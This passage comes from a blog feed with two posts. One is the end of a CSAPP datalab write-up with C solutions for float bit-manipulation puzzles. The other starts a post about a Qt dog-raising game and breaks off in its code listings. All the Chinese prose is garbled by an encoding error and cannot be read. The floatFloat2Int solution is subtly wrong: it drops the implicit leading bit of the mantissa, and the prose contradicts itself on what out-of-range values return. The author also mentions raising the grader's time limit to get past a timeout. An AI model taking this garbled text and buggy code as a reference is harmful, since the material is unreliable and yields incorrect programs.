class="hljs-built_in">exp</span> = (uf &gt;&gt; <span class="hljs-number">23</span>) &amp; <span class="hljs-number">0xFF</span>;<br>    <span class="hljs-comment">// åˆ†ç¦»å°¾æ•°ä½</span><br>    <span class="hljs-type">int</span> frac = uf &amp; <span class="hljs-number">0x7FFFFF</span>;<br>    <br>    <span class="hljs-keyword">if</span>(<span class="hljs-built_in">exp</span> == <span class="hljs-number">0xFF</span>) <br>    &#123;<br>        <span class="hljs-keyword">return</span> uf;<br>    &#125;<br>    <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(<span class="hljs-built_in">exp</span>==<span class="hljs-number">0</span>)<br>    &#123;<br>        frac &lt;&lt;= <span class="hljs-number">1</span>;<br><span class="hljs-keyword">return</span> (s &lt;&lt; <span class="hljs-number">31</span>) | (<span class="hljs-built_in">exp</span> &lt;&lt; <span class="hljs-number">23</span>) | frac;<br>    &#125;<br>    <span class="hljs-built_in">exp</span>++;   <br><span class="hljs-keyword">return</span> (s &lt;&lt; <span class="hljs-number">31</span>) | (<span class="hljs-built_in">exp</span> &lt;&lt; <span class="hljs-number">23</span>) | frac;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="floatFloat2Int"><a href="#floatFloat2Int" class="headerlink" title="floatFloat2Int"></a>floatFloat2Int</h3><p>é¢˜ç›®è¦æ±‚ï¼šå°†ç›®æ ‡ float æ•°æ®å¼ºåˆ¶è½¬æ¢ä¸º int å‹æ•°æ®ã€‚</p><p><del>è¿™é“é¢˜ä¸€å¼€å§‹å†™é”™äº†ï¼Œåˆç°æºœæºœå»æ‰¾è§£æğŸ¤</del></p><p><img src="/img/CSAPP-%E7%AC%AC%E4%BA%8C%E7%AB%A0-datalab/float%E7%BB%84%E6%88%90.png"></p><p>æ‰¾äº†ä¸€å¼ è¿™æ ·çš„å›¾çœ‹ä¸Šå»æ›´ç›´è§‚ä¸€ç‚¹</p><ul><li><code>exp=0</code>ï¼Œä¹Ÿå°±æ˜¯é˜¶ç å…¨æ˜¯0çš„éè§„æ ¼åŒ–æ•°ï¼Œæ­¤æ—¶ <code>E=1- (128-1)= -126</code>ï¼Œæˆ‘ä»¬è®¤ä¸ºè¿™æ˜¯ä¸€ä¸ªéå¸¸æ¥è¿‘ 0 çš„æ•°ï¼Œæ‰€ä»¥å¯ä»¥ç›´æ¥ <code>return 0</code></li><li><code>exp=255</code>ï¼Œä¹Ÿå°±æ˜¯ 0XFF æœ€å¤§å€¼ï¼Œç‰¹æ®Šå€¼NaNç›´æ¥è¿”å›æ•´æ•°å‹çš„æœ€å¤§å€¼ <code>return 0x80000000u</code></li><li><code>exp!=0&amp;&amp;exp!=255</code> ï¼Œä¹Ÿå°±æ˜¯è§„æ ¼åŒ–çš„æƒ…å†µã€‚æ­¤æ—¶ <code>E=exp-127</code> ï¼Œåˆåˆ†ä¸ºä¸‹é¢å‡ ç§æƒ…å†µï¼š<ul><li>E &lt; 0 æ—¶ï¼ŒV&lt;1ï¼Œ<code>return 0</code></li><li>E &gt;&#x3D; 23ï¼Œåˆ™è¿›è¡ŒåŠ æƒæ—¶ï¼Œéœ€è¦ frac å·¦ç§» <code>(E-23)</code> ä½</li><li>0 &lt; E &lt; 23ï¼Œéœ€è¦FRACå³ç§» <code>(23-E)</code> ä½</li><li>E &gt; 31ï¼ŒInfinity ç›´æ¥ <code>return 0</code></li></ul></li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/* </span><br><span class="hljs-comment"> * floatFloat2Int - Return bit-level equivalent of expression (int) f</span><br><span class="hljs-comment"> *   for floating point argument f.</span><br><span class="hljs-comment"> *   Argument is passed as unsign int, but</span><br><span class="hljs-comment"> *   it is to be interpreted as the bit-level representation of a</span><br><span class="hljs-comment"> *   single-precision floating point value.</span><br><span class="hljs-comment"> *   Anything out of range (including NaN and infinity) should return</span><br><span class="hljs-comment"> *   0x80000000u.</span><br><span class="hljs-comment"> *   Legal ops: Any integer/unsign operations incl. ||, &amp;&amp;. also if, while</span><br><span class="hljs-comment"> *   Max ops: 30</span><br><span class="hljs-comment"> *   Rating: 4</span><br><span class="hljs-comment"> */</span><br><span class="hljs-type">int</span> <span class="hljs-title function_">floatFloat2Int</span><span class="hljs-params">(<span class="hljs-type">unsigned</span> uf)</span> &#123;<br>    <span class="hljs-type">int</span> s = (uf &gt;&gt; <span class="hljs-number">31</span>) &amp; <span class="hljs-number">1</span>;<br>    <span class="hljs-type">int</span> <span class="hljs-built_in">exp</span> = (uf &gt;&gt; <span class="hljs-number">23</span>) &amp; <span class="hljs-number">0xFF</span>;<br>    <span class="hljs-type">int</span> frac = uf &amp; <span class="hljs-number">0x7FFFFF</span>;<br>    <span class="hljs-type">int</span> E=<span class="hljs-built_in">exp</span><span class="hljs-number">-127</span>;<br>    <br>    <span class="hljs-keyword">if</span>(E&lt;<span class="hljs-number">0</span>) <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(E&gt;=<span class="hljs-number">31</span>) <span class="hljs-keyword">return</span> <span class="hljs-number">1</span>&lt;&lt;<span class="hljs-number">31</span>;<br>    <span class="hljs-keyword">else</span><br>    &#123;<br>        <span class="hljs-keyword">if</span>(E&lt;<span class="hljs-number">23</span>) frac&gt;&gt;=(<span class="hljs-number">23</span> - E);<br>        <span class="hljs-keyword">else</span> frac&lt;&lt;=(E - <span class="hljs-number">23</span>);<br>    &#125;<br>    <span class="hljs-keyword">if</span>(s==<span class="hljs-number">1</span>) <span class="hljs-keyword">return</span> ~frac+<span class="hljs-number">1</span>;<br>    <span class="hljs-keyword">return</span> frac;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="floatPower2"><a href="#floatPower2" class="headerlink" title="floatPower2"></a>floatPower2</h3><p>é¢˜ç›®è¦æ±‚ï¼šå®ç° <code>pow(2,x)</code>ï¼Œè¿”å›ç»“æœä¸º <code>unsigned</code> </p><p>å› ä¸ºé¢˜ç›®æ˜¯å®ç°2çš„é˜¶ä¹˜ï¼Œæˆ‘ä»¬ç›´æ¥åœ¨äºŒè¿›åˆ¶çš„åŸºç¡€ä¸Šå·¦ç§»å°±è¡Œ</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/* </span><br><span class="hljs-comment"> * floatPower2 - Return bit-level equivalent of the expression 2.0^x</span><br><span class="hljs-comment"> *   (2.0 raised to the power x) for any 32-bit integer x.</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> *   The unsign value that is returned should have the identical bit</span><br><span class="hljs-comment"> *   representation as the single-precision floating-point number 2.0^x.</span><br><span class="hljs-comment"> *   If the result is too small to be represented as a denorm, return</span><br><span class="hljs-comment"> *   0. If too large, return +INF.</span><br><span class="hljs-comment"> * </span><br><span class="hljs-comment"> *   Legal ops: Any integer/unsign operations incl. ||, &amp;&amp;. Also if, while </span><br><span class="hljs-comment"> *   Max ops: 30 </span><br><span class="hljs-comment"> *   Rating: 4</span><br><span class="hljs-comment"> */</span><br><span class="hljs-type">unsigned</span> <span class="hljs-title function_">floatPower2</span><span class="hljs-params">(<span class="hljs-type">int</span> x)</span> &#123;<br>    <span class="hljs-type">int</span> <span class="hljs-built_in">exp</span> = x + <span class="hljs-number">127</span>;<br>    <span class="hljs-keyword">if</span>(<span class="hljs-built_in">exp</span> &lt;= <span class="hljs-number">0</span>) <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">if</span>(<span class="hljs-built_in">exp</span> &gt;= <span class="hljs-number">255</span>) <span class="hljs-keyword">return</span> <span class="hljs-number">0xff</span>&lt;&lt;<span class="hljs-number">23</span>;<br>    <span class="hljs-keyword">return</span> <span class="hljs-built_in">exp</span> &lt;&lt; <span class="hljs-number">23</span>;<br>&#125;<br></code></pre></td></tr></table></figure><hr><p>å¤ä¹ é¢˜ç›®å¯ä»¥å‘ç°å¾ˆå¤šè¯»ä¹¦æ¼æ‰çš„é‡è¦ä¸œè¥¿</p><p>ç¬¬ä¸€æ¬¡åšå®Œå®éªŒä¹Ÿå°±æµ…æµ…é”™äº†ä¸‰é“é¢˜ 11 ä¸ªæµ‹è¯•ç½¢äº†ğŸ¥²</p><p><img src="/img/CSAPP-%E7%AC%AC%E4%BA%8C%E7%AB%A0-datalab/datalab_result_1.png"></p><p>æœ€åä¸€é“é¢˜æ€»æ˜¯TIMEOUTï¼Œçœ‹äº†åˆ«çš„å¸ˆå‚…çš„ä¹Ÿæ˜¯è¿™æ ·å¹²è„†æ”¹äº† <code>btest.c</code> é‡Œçš„æ—¶é™</p><p><img src="/img/CSAPP-%E7%AC%AC%E4%BA%8C%E7%AB%A0-datalab/datalab%E5%AE%8C%E7%BB%93.png"></p><p>å®Œç»“æ’’èŠ±æ’’èŠ±~</p>]]></content>
    
    
    <categories>
      
      <category>è¯»ä¹¦ç¬”è®°</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Knowledge</tag>
      
      <tag>CSAPP</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>ç”¨QTåšä¸ªå…»æˆç±»å°æ¸¸æˆ</title>
    <link href="/2023/09/17/%E7%94%A8QT%E5%81%9A%E4%B8%AA%E5%85%BB%E6%88%90%E7%B1%BB%E5%B0%8F%E6%B8%B8%E6%88%8F/"/>
    <url>/2023/09/17/%E7%94%A8QT%E5%81%9A%E4%B8%AA%E5%85%BB%E6%88%90%E7%B1%BB%E5%B0%8F%E6%B8%B8%E6%88%8F/</url>
    
    <content type="html"><![CDATA[<p>è®°å½•çŸ­å­¦æœŸä½œä¸šçš„å®Œæˆè¿‡ç¨‹</p><span id="more"></span><p>æˆ‘çš„é˜Ÿå‹æ˜¯ChatGPTï¼Œè‡´æ•¬äººå·¥æ™ºèƒ½ğŸ‘©ğŸ¼â€ğŸ’»</p><p>â€œå°ç‹—æ’‘èµ·ä¸€ä¸ªå®¶â€ æ˜¯ä¸€æ¬¾æœ‰è¶£çš„å°ç‹—å…»æˆç±»æ¸¸æˆï¼Œè®©ç©å®¶ä½“éªŒå…»è‚²å¯çˆ±å°ç‹—ã€æ‰“ç†å®¶åº­å’Œå‚ä¸å„ç§å†’é™©çš„ä¹è¶£ã€‚åœ¨è¿™ä¸ªæ¸¸æˆä¸­ï¼Œç©å®¶å°†æ‰®æ¼”ä¸€ä½çˆ±å¿ƒæ»¡æ»¡çš„ä¸»äººï¼Œæ”¶å…»ä¸€åªå¯çˆ±çš„å°ç‹—ï¼Œå¹¶ä¸å®ƒä¸€èµ·å»ºç«‹ä¸€ä¸ªå¹¸ç¦çš„å®¶åº­ã€‚</p><hr><h3 id="1-å·¥å…·å‡†å¤‡"><a href="#1-å·¥å…·å‡†å¤‡" class="headerlink" title="1.å·¥å…·å‡†å¤‡"></a>1.å·¥å…·å‡†å¤‡</h3><ul><li>å¯ä»¥ç¼–è¯‘c++ç¨‹åºçš„ç¼–è¯‘å™¨ï¼Œå’Œç¼–å†™ä»£ç çš„è½¯ä»¶ã€‚æˆ‘ä½¿ç”¨çš„æ˜¯VSCodeï¼ŒåæœŸç›´æ¥ç”¨QTCreatå†™äº†</li><li>QT Creatorå’ŒQt Designerï¼ˆå…¶å®QT Creatorä¸€ä¸ªé›†åˆç¯å¢ƒå°±å¯ä»¥å…¨éƒ¨å®ç°ï¼Œä½†æ˜¯æˆ‘æ¯æ¬¡è®¾ç½®æ–°å¢é¡µé¢çš„æ ·å¼è¡¨éƒ½ä¼šå¡æ­»ã€‚ä¸ºäº†é¿å…å¡æ­»ä¸¢å¤±æ•°æ®æˆ‘é€‰æ‹©ç”¨Qt Designerå•ç‹¬å®Œæˆuiç•Œé¢çš„è®¾ç½®ï¼‰</li></ul><h3 id="2-é¢˜ç›®"><a href="#2-é¢˜ç›®" class="headerlink" title="2.é¢˜ç›®"></a>2.é¢˜ç›®</h3><p>åŸºäºQTå¼€å‘ä¸€æ¬¾åŠ¨ç‰©ä¸–ç•Œå°æ¸¸æˆ</p><p>ç›®çš„ï¼šæ¨¡æ‹Ÿä¸€ä¸ªåŠ¨ç‰©å®¶åº­ã€‚é€šè¿‡è®¾è®¡å’Œç¼–å†™è¯¥ç¨‹åºï¼Œé”»ç‚¼ç»“æ„åŒ–ç¨‹åºè®¾è®¡å’Œé¢å‘å¯¹è±¡çš„åŸºæœ¬ç¼–ç¨‹æŠ€èƒ½ï¼Œæé«˜ç¨‹åºç»„ç»‡çš„åˆç†æ€§ã€å¯è¯»æ€§å’Œå¯ç»´æŠ¤æ€§ã€‚</p><p>è¦æ±‚ï¼šè®¾è®¡ä¸€ä¸ªçˆ±å¿ƒå®¶åº­ï¼›åŠŸèƒ½åŒ…æ‹¬æœ‰è‹¥å¹²åŠ¨ç‰©å®¶åº­æˆå‘˜ï¼Œæ¨¡æ‹Ÿæˆå‘˜æ—¥å¸¸çš„åƒã€ç©ã€ç—…ã€ä»¥åŠè´­ç‰©ã€å·¥ä½œã€åšå®¶åŠ¡ç­‰åŠŸèƒ½ã€‚å»ºè®®é‡‡ç”¨è‰¯å¥½çš„æ§åˆ¶å°äººæœºäº¤äº’ç•Œé¢ã€‚ </p><blockquote><p>æœ€ååªå®ç°äº†ä¸€ä¸ªç‹—ç‹—å®¶åº­æˆå‘˜</p></blockquote><p>é—®é¢˜æè¿°ï¼š</p><p>ï¼ˆ1ï¼‰  åˆå§‹æ—¶å…·æœ‰åŸºæœ¬çš„ç”Ÿå‘½ç‰¹å¾å’Œç”Ÿå­˜æ¡ä»¶ã€‚</p><p>ï¼ˆ2ï¼‰  å½“åƒä¸œè¥¿åï¼Œä½“é‡å¢åŠ ï¼Œä½“èƒ½å¢åŠ ï¼›</p><p>ï¼ˆ3ï¼‰  å½“é”»ç‚¼åï¼Œä½“é‡ä¸‹é™ï¼Œä½“èƒ½ä¸‹é™ï¼Œè¦æ±‚æ¢å¤ä½“åŠ›ï¼›</p><p>ï¼ˆ4ï¼‰  å¹²æ´»åï¼Œä½“èƒ½ä¸‹é™ï¼Œçˆ±å¿ƒå¢åŠ ï¼Œèƒ½åŠ›å¢åŠ ï¼›</p><p>ï¼ˆ5ï¼‰  æ‰“å·¥åï¼Œä½“èƒ½ä¸‹é™ï¼Œç»éªŒå’Œé‡‘é’±ä¸Šå‡ï¼Œçˆ±å¿ƒå¢åŠ ï¼›</p><p>ï¼ˆ6ï¼‰  æ²¡æœ‰é£Ÿå“ï¼Œå°±å¤„äºé¥¥é¥¿çŠ¶æ€ï¼ŒæŠ¥è­¦ï¼›</p><p>ï¼ˆ7ï¼‰  ä¹°é£Ÿå“ï¼Œéœ€è¦ä»˜å‡ºé‡‘é’±ï¼›</p><p>è¦æ±‚æœ‰å•†åº—ã€å•†åº—ä¸­æœ‰å¤šç§ç±»å•†å“ï¼Œå·¥ä½œä¹Ÿæœ‰å¤šä¸ªç§ç±»ã€‚</p><h3 id="3-æµç¨‹"><a href="#3-æµç¨‹" class="headerlink" title="3.æµç¨‹"></a>3.æµç¨‹</h3><h5 id="3-1-æ­£ç»æµç¨‹"><a href="#3-1-æ­£ç»æµç¨‹" class="headerlink" title="3.1 æ­£ç»æµç¨‹"></a>3.1 æ­£ç»æµç¨‹</h5><ul><li>æ¸¸æˆå¼€å§‹</li></ul><p><img src="/img/%E7%94%A8QT%E5%81%9A%E4%B8%AA%E5%85%BB%E6%88%90%E7%B1%BB%E5%B0%8F%E6%B8%B8%E6%88%8F/Snipaste_2023-06-19_16-21-26.png"></p><ul><li>æ¸¸æˆæµç¨‹</li></ul><p><img src="/img/%E7%94%A8QT%E5%81%9A%E4%B8%AA%E5%85%BB%E6%88%90%E7%B1%BB%E5%B0%8F%E6%B8%B8%E6%88%8F/Snipaste_2023-06-19_20-56-38.png"></p><ul><li>å®¶åº­å±æ€§å’Œæˆå‘˜å±æ€§</li></ul><p><img src="/img/%E7%94%A8QT%E5%81%9A%E4%B8%AA%E5%85%BB%E6%88%90%E7%B1%BB%E5%B0%8F%E6%B8%B8%E6%88%8F/Snipaste_2023-06-19_21-39-59.png"></p><h5 id="3-2-æ¸¸æˆè§„åˆ™"><a href="#3-2-æ¸¸æˆè§„åˆ™" class="headerlink" title="3.2 æ¸¸æˆè§„åˆ™"></a>3.2 æ¸¸æˆè§„åˆ™</h5><p>é¦–å…ˆå¼€å±€å®¶åº­ä¸­æœ‰10é‡‘å¸ï¼Œé£Ÿç‰©å‚¨å­˜ä¸º0ï¼Œçˆ±å¿ƒæ•°é‡ä¸º5ï¼Œå¯é€‰æ‹©ä¸€ä½åŠ¨ç‰©å®¶åº­æˆå‘˜ã€‚</p><p>æˆ‘çˆ±å°ç‹—ï¼Œæ‰€æœ‰åŠ¨ç‰©æˆå‘˜éƒ½æ˜¯å°ç‹—ï¼Œå¯é€‰ä¸åŒå“ç§ï¼Œä¸åŒå“ç§æœ‰ä¸åŒçš„ç‰¹ç‚¹ã€‚</p><p>æ”¶å…»æ–°çš„å®¶åº­æˆå‘˜éœ€è¦æ¶ˆè€—çˆ±å¿ƒï¼Œæ¯ä¸€åªç‹—ç‹—æ¶ˆè€—äº”é¢—çˆ±å¿ƒï¼ŒæŠŠååªç‹—ç‹—ç‹—é¢†å…»å›å®¶å¯ä»¥è·å¾—ä¸€ä¸ªè£èª‰ã€‚åšå®¶åŠ¡å’Œæ‰“å·¥éƒ½å¯ä»¥è·å¾—çˆ±å¿ƒã€‚çˆ±å¿ƒæ¯è¾¾åˆ°åçš„å€æ•°å°±å¥–åŠ±ä¸€é¢—çˆ±å¿ƒã€‚</p><p>åœ¨æ¸¸æˆè¿‡ç¨‹ä¸­ï¼Œè´­ä¹°é£Ÿç‰©éœ€è¦æ¶ˆè€—é‡‘å¸ï¼ŒåŠ¨ç‰©å®¶åº­æˆå‘˜å¤–å‡ºæ‰“å·¥å¯ä»¥èµšé‡‘å¸ï¼Œé‡‘å¸è¾¾åˆ°666å¯è·å¾—ä¸€ä¸ªè£èª‰ã€‚</p><p>åŠ¨ç‰©å®¶åº­æˆå‘˜åˆšåˆšåˆ°å®¶æ—¶çš„ä½“åŠ›ä¸º10ï¼ˆä½“åŠ›æ»¡ä¸º10ï¼‰ï¼Œèƒ½åŠ›ä¸º0ã€‚æ‰“å·¥å’Œåšå®¶åŠ¡éƒ½éœ€è¦æ¶ˆè€—ä½“åŠ›ï¼Œè¿›é£Ÿå¯ä»¥è¡¥å……ä½“åŠ›ã€‚ä½“åŠ›ä½äº3ä¸èƒ½é”»ç‚¼ã€æ‰“å·¥å’Œåšå®¶åŠ¡ï¼Œä½“åŠ›ä½äº2å³ä½“åŠ›ä¸º1æ—¶ä¼šæç¤ºï¼Œä½“åŠ›ä¸º0å°±ä¼šç”Ÿç—…ã€‚åšå®¶åŠ¡å’Œæ‰“å·¥éƒ½å¯ä»¥å¢åŠ èƒ½åŠ›ï¼Œåªæœ‰èƒ½åŠ›è¾¾åˆ°5ï¼ŒåŒæ—¶ä½“åŠ›å¤§äº3æ‰èƒ½å¤–å‡ºæ‰“å·¥ã€‚</p><p>å¤§å‹çŠ¬å’Œå°å‹çŠ¬æ¯æ¬¡æ´»åŠ¨çš„æ¶ˆè€—å’Œå›æŠ¥ä¸ä¸€æ ·ã€‚</p><h3 id="5-éƒ¨åˆ†ä»£ç "><a href="#5-éƒ¨åˆ†ä»£ç " class="headerlink" title="5.éƒ¨åˆ†ä»£ç "></a>5.éƒ¨åˆ†ä»£ç </h3><h4 id="5-1-QTå†…ç±»çš„å®ç°"><a href="#5-1-QTå†…ç±»çš„å®ç°" class="headerlink" title="5.1 QTå†…ç±»çš„å®ç°"></a>5.1 QTå†…ç±»çš„å®ç°</h4><p>Dogç±»ç¤ºä¾‹</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">//å¤´æ–‡ä»¶</span><br><span class="hljs-meta">#<span class="hljs-keyword">ifndef</span> DOG_H</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> DOG_H</span><br><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;QPixmap&gt;</span></span><br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Dog</span></span><br><span class="hljs-class">&#123;</span><br>protected:<br>    <span class="hljs-type">int</span> ability;    <span class="hljs-comment">//èƒ½åŠ›</span><br>    <span class="hljs-type">double</span> energy;   <span class="hljs-comment">//ç²¾åŠ›</span><br>    QString name;   <span class="hljs-comment">//åå­—</span><br>    <span class="hljs-type">int</span> ill;     <span class="hljs-comment">//ç–¾ç—…çŠ¶æ€</span><br>    <span class="hljs-type">int</span> worktime;  <span class="hljs-comment">//åˆ¤æ–­å·¥ä½œæ—¶é•¿</span><br>    <span class="hljs-type">int</span> state;  <span class="hljs-comment">//åˆ¤æ–­æ˜¯å¦æ­£åœ¨å¿™ç¢Œ</span><br><br>public:<br><br>    Dog();<br>    virtual ~Dog();<br><br>    <span class="hljs-type">void</span> <span class="hljs-title function_">DogGrow</span><span class="hljs-params">()</span>;   <span class="hljs-comment">//æ—¥å¸¸ç²¾åŠ›æ¶ˆè€—</span><br>    <span class="hljs-type">void</span> <span class="hljs-title function_">setDogName</span><span class="hljs-params">(QString Dogname)</span>;   <br>    <span class="hljs-type">void</span> <span class="hljs-title function_">setDogAbility</span><span class="hljs-params">(<span class="hljs-type">int</span> Dogability)</span>;<br>    <span class="hljs-type">void</span> <span class="hljs-title function_">setDogEnergy</span><span class="hljs-params">(<span class="hljs-type">double</span> Dogenergy)</span>;<br>    <span class="hljs-type">void</span> <span class="hljs-title function_">resetDogIll</span><span class="hljs-params">()</span>;<br>    <span class="hljs-type">void</span> <span class="hljs-title function_">setDogIll</span><span class="hljs-params">(<span class="hljs-type">int</span> DogIll)</span>;<br>    <span class="hljs-type">void</span> <span class="hljs-title function_">setDogState</span><span class="hljs-params">(<span class="hljs-type">int</span> Dogstate)</span>;<br>    <span class="hljs-type">void</span> <span class="hljs-title function_">setDogWorktime</span><span class="hljs-params">(<span class="hljs-type">int</span> Worktime)</span>;<br><br>    QString <span class="hljs-title function_">getDogName</span><span class="hljs-params">()</span>;<br>    <span class="hljs-type">int</span> <span class="hljs-title function_">getDogAbility</span><span class="hljs-params">()</span>;<br>    <span class="hljs-type">double</span> <span class="hljs-title function_">getDogEnergy</span><span class="hljs-params">()</span>;<br>    <span class="hljs-type">int</span> <span class="hljs-title function_">getDogIll</span><span class="hljs-params">()</span>;<br>    <span class="hljs-type">int</span> <span class="hljs-title function_">getDogState</span><span class="hljs-params">()</span>;<br>    <span class="hljs-type">int</span> <span class="hljs-title function_">getDogWorktime</span><span class="hljs-params">()</span>;<br>    <span class="hljs-type">void</span> <span class="hljs-title function_">judgeDogIll</span><span class="hljs-params">()</span>;<br><br>    <span class="hljs-type">void</span> <span class="hljs-title function_">doHousework</span><span class="hljs-params">()</span>;<br>    virtual <span class="hljs-type">void</span> <span class="hljs-title function_">doWork</span><span class="hljs-params">()</span> = <span class="hljs-number">0</span>;<br>    virtual <span class="hljs-type">void</span> <span class="hljs-title function_">eat</span><span class="hljs-params">(<span class="hljs-type">int</span> food)</span> = <span class="hljs-number">0</span>;<br>&#125;;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">BigDog</span> :</span> public Dog<br>&#123;<br>public:<br>    BigDog();<br>    <span class="hljs-type">void</span> <span class="hljs-title function_">eat</span><span class="hljs-params">(<span class="hljs-type">int</span> food)</span> override;<br>    <span class="hljs-type">void</span> <span class="hljs-title function_">doWork</span><span class="hljs-params">()</span> override;<br>&#125;;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">SmallDog</span> :</span> public Dog<br>&#123;<br>public:<br>    SmallDog();<br>    <span class="hljs-type">void</span> <span class="hljs-title function_">eat</span><span class="hljs-params">(<span class="hljs-type">int</span> food)</span> override;<br>    <span class="hljs-type">void</span> <span class="hljs-title function_">doWork</span><span class="hljs-params">()</span> override;<br>&#125;;<br><br><span class="hljs-meta">#<span class="hljs-keyword">endif</span> <span class="hljs-comment">// DOG_H</span></span><br><br></code></pre></td></tr></table></figure><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span 